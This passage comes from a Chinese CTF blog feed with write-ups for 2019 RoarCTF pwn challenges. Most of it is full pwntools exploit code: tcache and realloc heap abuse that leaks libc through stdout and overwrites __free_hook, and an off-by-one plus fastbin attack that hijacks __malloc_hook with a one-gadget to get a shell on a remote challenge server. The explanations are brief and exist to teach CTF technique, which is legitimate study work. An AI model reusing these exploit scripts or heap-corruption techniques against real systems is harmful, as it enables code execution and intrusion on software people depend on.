class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size?"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> size <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content?"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'666'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># we will use this chunk to overlapping later chunk</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Delete()</span>create<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">"\x33"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># split top chunk and this chunk, in order to stop consolidation</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Delete<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 為什麼不能用delete代替</span><span class="token comment" spellcheck="true"># 詳細說明最後一個為什麼要create(0),首先梳理一邊兩者基本區別：create（0）是指針清0同時釋放空間</span><span class="token comment" spellcheck="true"># free只是釋放空間但是指針還是指向釋放的chunk，這樣會存在這個問題：當再次申請比當前釋放小的chunk時會將</span><span class="token comment" spellcheck="true"># 這個chunk切一部分給新chunk這樣就打亂了分配空間不好利用了。</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">,</span><span class="token string">"\x88"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">"\x55"</span><span class="token operator">*</span><span class="token number">0x110</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x60\x07\xdd"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 这里修改尺寸的原因</span><span class="token comment" spellcheck="true"># 注意一個問題：當開啟地質隨機化的時候只需修改兩個byte，最高位需要猜1/16的概率，而關閉則需要改三個byte</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 這裡是釋放0x200</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"\x99"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 因為tcache類似於fastbin的分配策略，所以我們需要將最前面的chunk使用，以達到下次分配的是目標地址</span><span class="token comment" spellcheck="true"># 在43行創建新chunk之前並不會顯示tcache已經指向了target_goal，也就是說明tcache的機制它是在</span><span class="token comment" spellcheck="true"># chunk被取出的時候來更新fd指針的</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 這裡也就解釋了為什麼要將前面的size修改，因為不修改那麼這裡又會進入到0x110的tcache,那麼一create還是這個chunk,無法達到目標地址</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7dcf780</span> <span class="token operator">-</span> <span class="token number">0x7ffff79e4000</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>Magic<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 釋放這個指針，重新再利用。這裡為什麼又不用create(0)?是因為用的話之前在stdout的那個chunk就會進入tcache</span><span class="token comment" spellcheck="true"># 導致一系列錯誤 </span><span class="token comment" spellcheck="true"># 但是這裡為了預防tcache鏈發生混亂，在這裡我們選取三個大小的chunk，分別是沒有用的</span><span class="token comment" spellcheck="true"># 0x90、0xa0、0x70</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"new1"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"new2"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"new3"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"new2"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 最後一個delete和create到底有什麼不同</span>    Delete<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"new1"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 更新tcache的fd指針</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 將這個chunk釋放，由於其size已經發生改變所以不會再次進入0xa0的list</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h2><h3 id="ubuntu18下realloc的特性："><a href="#ubuntu18下realloc的特性：" class="headerlink" title="ubuntu18下realloc的特性："></a>ubuntu18下realloc的特性：</h3><p>realloc(0)==free + 清空指针<br>realloc(newsize&gt;oldsize)==overlapping<br>realloc(newsize&lt;oldsize)==edit<br>realloc(newsize):当free了&amp;指针清空了==add<br>注意一下free和realloc(0)的区别</p><h3 id="tcache机制"><a href="#tcache机制" class="headerlink" title="tcache机制"></a>tcache机制</h3><p>1.类似fastbin的分配策略：先入后出，同时相同大小只有7个，注意不要把大chunk跟unsorted bin的分配策略弄混淆<br>2.没有double free的检查<br>3.注意其fd指针是在写入chunk后，在取出的时候才进行更新的</p><h1 id="0x04-easy-pwn"><a href="#0x04-easy-pwn" class="headerlink" title="0x04 easy_pwn"></a>0x04 easy_pwn</h1><h2 id="查看文件-3"><a href="#查看文件-3" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/14.png"></div>从保护判断可能就是hijaking hook来进行getshell吧## IDA分析### 读取数据功能：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/15.png"></div>支持读取0~0x100的数据，那么这里就限制了chunk的大小### create<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/16.png"></div>没有发现什么漏洞### edit<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/17.png"></div>这里有个off by one的漏洞，意思主要就是：当edit时输入大于原size10的size时会有一个off by one的漏洞### show<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/18.png"></div>打印函数## 利用思路这里思路肯定就是利用off by one的方式进行overlapping，控制小chunk先进行泄露libcbase，再进行fastbin attack攻击，hijaking malloc_hook。这里会有一个小trick，就是劫持mallochook不能成功，之前遇到过这个问题。## 步骤### 步骤一：leak libcbase```pythoncreate(0x68) # 0create(0x68) # 1create(0x68) # 2create(0x68) # 3create(0x68) # 4create(0x68) # 5create(0x68) # 6create(0x68) # 7edit(1,0x68+10,"a"*0x60+p64(0)+"\xe1")delete(2)create(0x68) # 2show(3)p.recvuntil("content: ")data = u64(p.recv(6).ljust(8,"\x00"))print hex(data)main_arean = data-88libc_base = main_arean - 0x3c4b20```<h3 id="步骤二fastbin-attack"><a href="#步骤二fastbin-attack" class="headerlink" title="步骤二fastbin attack"></a>步骤二fastbin attack</h3><pre class="line-numbers language-python"><code class="language-python">target_addr <span class="token operator">=</span> data<span class="token number">-0x8b</span>one_gadgets<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xe1"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#5</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x58</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="步骤三hijaking-got"><a href="#步骤三hijaking-got" class="headerlink" title="步骤三hijaking got"></a>步骤三hijaking got</h3><pre class="line-numbers language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadgets<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"realloc"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># p = process("./easy_pwn")</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.97.182.233"</span><span class="token punctuation">,</span><span class="token number">33619</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easy_pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 7</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xe1"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># overlapping</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span>main_arean <span class="token operator">=</span> data<span class="token number">-88</span>libc_base <span class="token operator">=</span> main_arean <span class="token operator">-</span> <span class="token number">0x3c4b20</span>target_addr <span class="token operator">=</span> data<span class="token number">-0x8b</span>one_gadgets<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xe1"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#5</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x58</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadgets<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"realloc"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2019 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
            <tag> io leak </tag>
            
            <tag> double free </tag>
            
            <tag> off by one </tag>
            
            <tag> libc-2.27 realloc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 IISC线上赛PWN解题</title>
      <link href="/2020/10/27/2020-iisc-xian-shang-sai-pwn-jie-ti/"/>
      <url>/2020/10/27/2020-iisc-xian-shang-sai-pwn-jie-ti/</url>
      
